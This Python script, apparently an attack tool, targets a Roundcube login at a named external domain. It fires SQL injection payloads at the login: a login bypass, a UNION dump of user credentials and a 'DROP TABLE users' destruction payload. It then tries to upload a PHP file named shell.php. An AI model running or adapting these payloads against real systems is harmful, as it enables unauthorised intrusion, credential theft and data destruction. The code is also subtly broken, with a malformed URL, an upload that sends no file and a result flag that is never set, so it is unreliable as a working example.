#!/usr/bin/env python3
import requests
import subprocess
import os

TARGET_URL = "http://waal968.icu/?_task=login"

def check_sql_injection():
    print("\n[1] Testing SQL Injection (Username Field)...")
    
    # Payloads that force a database query even if they don't log you in successfully
    payloads = [
        ("' OR '1'='1#", "Boolean Bypass"),
        ("UNION SELECT user,pass FROM users--", "Database Dump Attempt"),
        ("'; DROP TABLE users; --", "Data Destruction Test")
    ]

    for payload, desc in payloads:
        try:
            # Inject directly into the URL query string (simulating a GET request to login)
            url = f"{TARGET_URL}?user={payload}&pass=admin"
            r = requests.get(url, timeout=10)
            
            print(f"  Payload ({desc}): Status {r.status_code}")
            
            # Check for specific indicators of success/failure
            content_lower = r.text.lower()
            
            # If it logs you in (status 200 and "success") -> SQLi Success
            if r.status_code == 200:
                if "login successful" in content_lower or "welcome" in content_lower:
                    print("  >>> VULNERABLE! SQL Injection allows login bypass.")
                    return True, payload
                
                # If it returns an error mentioning MySQL/SQL -> Database Access Confirmed
                if "mysql" in content_lower or "sqlstate" in content_lower or "error" in content_lower:
                    print("  >>> DATABASE ERROR DETECTED! (Possible DB access).")
                    
        except Exception as e:
            pass

def test_file_upload():
    print("\n[2] Testing Direct File Upload...")
    
    # Create a tiny PHP file that just echoes "I AM EXECUTING" if run
    payload_content = b"<?php echo 'EXECUTED'; ?>"
    
    import tempfile
    fd, tmp_path = tempfile.mkstemp(suffix='.php')
    try:
        with open(tmp_path, 'wb') as f:
            f.write(payload_content)
        
        print(f"  Created payload at {tmp_path}")
        
        # Try the most common Roundcube upload endpoint
        url = TARGET_URL + "/roundcubemail/api/v2/file_upload"
        
        try:
            files = {'file': ('shell.php', payload_content, 'application/php')}
            r = requests.post(url, timeout=10)
            
            print(f"  Upload Status: {r.status_code}")
            
            # Check if the server actually processed it (might return 200 even on error sometimes)
            content_lower = r.text.lower()
            if "executed" in content_lower or "vulnerable" in content_lower:
                print("  >>> FILE UPLOAD SUCCESSFUL! Code Execution Possible.")
                return True, tmp_path
            
        except Exception as e:
            pass
        
    finally:
        os.unlink(tmp_path)

if __name__ == "__main__":
    # Ensure requests is installed
    try:
        import requests
    except ImportError:
        print("Installing python-requests...")
        subprocess.run(["sudo", "apt-get", "update"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pip3", "install", "-q", "requests"], check=False)

    print("Starting CVE Scan...")
    
    sql_found = False
    
    # Run SQLi tests
    for i in range(3):
        if check_sql_injection():
            break
            
    # If no obvious success, try the upload test
    if not sql_found:
        test_file_upload()

    print("\n[Scan Complete]")

